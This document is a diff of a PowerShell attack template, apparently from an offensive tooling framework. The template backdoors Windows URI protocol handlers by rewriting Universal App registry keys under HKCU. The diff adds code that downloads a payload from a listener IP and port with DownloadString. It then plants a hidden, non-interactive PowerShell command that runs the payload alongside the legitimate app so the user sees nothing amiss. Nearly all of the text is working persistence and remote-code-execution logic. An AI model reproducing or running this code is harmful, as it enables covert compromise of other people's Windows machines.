@@ -1,36 +1,34 @@
 Begin {
-    $listeningIp = "{listeningIp}"
-    $httpPort = "{httpPort}"
+    $listeningIp = "{LISTENINGIP}"
+    $httpPort = "{HTTPPORT}"
     $isOnlineFetch = "{ISONLINEFETCH}"
-    $proxyRequest = "{PROXYREQUEST}"
-
+    $powershellVersion = "{POWERSHELLVERSION}"
     $payloadsDetails =
     @(
     "{{PAYLOADS}}"
     )
 
-    function UpdateRegistryKey($gadgetPayload, $cmdSeparator, $defaultHandler)
+    function UpdateRegistryKey($finalPayload)
     {
+        $finalPayload
         $ErrorActionPreference = "SilentlyContinue"
+        Write-Host -BackgroundColor Red "Universal App to hijack:"
+        Write-Host -BackgroundColor DarkGray "$appxID"
         New-Item -Path "HKCU:\\Software\Classes\" -name "$appxID"
         New-Item -Path "HKCU:\\Software\Classes\$appxID\" -Name "shell"
         New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\" -Name "open"
         New-Item -Path "HKCU:\\Software\Classes\$appxID\shell\open\" -Name "command"
-        Write-Host -BackgroundColor Red "Universal App to hijack:"
-        Write-Host -BackgroundColor DarkGray "$appxID"
         Write-Host -BackgroundColor Red "Payload used:"
-        Write-Host -BackgroundColor DarkGray "$gadgetPayload $cmdSeparator $defaultHandler"
-        Set-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -value "$gadgetPayload $cmdSeparator $defaultHandler"
+        Write-Host -BackgroundColor DarkGray "$finalPayload"
+        Set-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -value "$finalPayload"
         Remove-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "DelegateExecute"
     }
 }
 
 Process {
-    $proxySymbol = if ($proxyRequest) { "%1 %*" } else { "" }
-
     $payloadsDetails | ForEach-Object {
-        $uriProtocol = $_.UriProtocol;
-        Write-Host -BackgroundColor Green "URI scheme to backdoor: $uriProtocol"
+        $uriProtocol = $_.UriProtocol
+        Write-Host -BackgroundColor Blue "URI scheme to backdoor: $uriProtocol"
         $gadgetPayload = If ($isOnlineFetch)
         {
             (New-Object net.webclient).DownloadString("http://" + $listeningIp + ":" + $httpPort + "/" + $_.UniqueID)
@@ -39,41 +37,52 @@ Process {
         {
             $_.PayloadContent
         }
-        $cmdSeparator = If ($gadgetPayload.StartsWith("powershell")) { ";" } Else { "&" }
-
-        try # check if user has already chosen a default Universal App handler for the defined URI scheme via 'UserChoice' key lookup
+        try # check if user has already chosen a default Universal App handler for the defined URI scheme via 'UserChoice' key lookup under HKCU or HKLM
         {
             $appxID = $( Get-ItemProperty -Path "HKCU:\\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\$uriProtocol\UserChoice" -Name "ProgID" -ErrorAction Stop ).ProgId
-
-            # get pathname of the binary of the Universal App (via lookup in HKLM and as fallback in HKEY_CURRENT_USER)
-            $AppUserModelID = (Get-ItemProperty -Path "HKLM:\\Software\Classes\$appxID\Application" -ErrorAction SilentlyContinue).AppUserModelID
+            # get pathname of the binary of the Universal App (via ordered lookup in HKEY_CURRENT_USER and as fallback in HKLM)
+            $appUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction SilentlyContinue).AppUserModelID
+            $currValue = $(Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue).'(default)'
             if ( [string]::IsNullOrEmpty($AppUserModelID))
             {
-                $AppUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction Stop).AppUserModelID
+                $appUserModelID = (Get-ItemProperty -Path "HKLM:\\Software\Classes\$appxID\Application" -ErrorAction Stop).appUserModelID
+                $currValue = $(Get-ItemProperty -Path "HKLM:\\Software\Classes\$appxID\Shell\open\command" -Name "(Default)" -ErrorAction SilentlyContinue).'(default)'
             }
-
-            UpdateRegistryKey($gadgetPayload, $cmdSeparator, ("cmd.exe /c start shell:Appsfolder\$AppUserModelID $proxySymbol"))
+            $gadgetPayload = $gadgetPayload.Replace("''","'")
+            $currValue = $currValue.Replace('"',"'")
+            $finalPayload = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c " & {{DEFAULTHANDLER}} ; {{GADGETPAYLOAD}}"').Replace('{{POWERSHELLVERSION}}', $powershellVersion).Replace('{{DEFAULTHANDLER}}',"$currValue").Replace('{{GADGETPAYLOAD}}', "$gadgetPayload")
+            UpdateRegistryKey($finalPayload)
         }
         catch # if no explicit default app has been chosen, then lookup via 'windows.protocol' and backdoor all the Universal App IDs available for the defined URI protocol
         {
-            New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR -ErrorAction SilentlyContinue
-            Set-Location "HKCR:Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\PackageRepository\Extensions\windows.protocol\$uriProtocol" -ErrorAction SilentlyContinue
-            $appxIDs = $( Get-ChildItem . ).PSChildName
-            if ($appxIDs)
+            try
             {
-                $appxIDs | ForEach-Object {
-                    $appxID = $_
-                    # find the modelId to trigger the legitimate handler via 'shell:\Appsfolder\$AppUserModelID' shortcut and transparently proxy the request to it
-                    try
-                    {
-                        $AppUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction Stop).AppUserModelID
-                        UpdateRegistryKey($gadgetPayload, $cmdSeparator, ("cmd.exe /c start shell:Appsfolder\$AppUserModelID $proxySymbol"))
-                    }
-                    catch # if key does not exists yet, create it
-                    {
-                        UpdateRegistryKey($gadgetPayload, "", "")
+                New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR -ErrorAction SilentlyContinue
+                Set-Location "HKCR:Local Settings\Software\Microsoft\Windows\CurrentVersion\AppModel\PackageRepository\Extensions\windows.protocol\$uriProtocol" -ErrorAction Stop
+                $appxIDs = $( Get-ChildItem . ).PSChildName
+                if ($appxIDs)
+                {
+                    $appxIDs | ForEach-Object {
+                        $appxID = $_
+                        # find the modelId to trigger the legitimate handler via 'shell:\Appsfolder\$AppUserModelID' shortcut and transparently proxy the request to it
+                        try
+                        {
+                            $appUserModelID = (Get-ItemProperty -Path "HKCU:\\Software\Classes\$appxID\Application" -ErrorAction Stop).AppUserModelID
+                            $universalAppHandler = "'cmd.exe' /c start shell:Appsfolder\$appUserModelID"
+                            $finalPayload = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c " & {{DEFAULTHANDLER}} ; {{GADGETPAYLOAD}}"').Replace('{{POWERSHELLVERSION}}', $powershellVersion).Replace('{{DEFAULTHANDLER}}',"$universalAppHandler").Replace('{{GADGETPAYLOAD}}', "$gadgetPayload")
+                            UpdateRegistryKey($finalPayload)
+                        }
+                        catch # if key does not exists yet, create it
+                        {
+                            $finalPayload = ('powershell -v {{POWERSHELLVERSION}} -NoP -NonI -W Hidden -c "{{GADGETPAYLOAD}}"').Replace('{{POWERSHELLVERSION}}', $powershellVersion).Replace('{{GADGETPAYLOAD}}', "$gadgetPayload")
+                            UpdateRegistryKey($finalPayload)
+                        }
                     }
                 }
+            }
+            catch
+            {
+                Write-Host "Please rerun the command from a clean powershell console."
             }
         }
     }
@@ -82,4 +91,3 @@ Process {
 End {
     [GC]::Collect()
 }
-
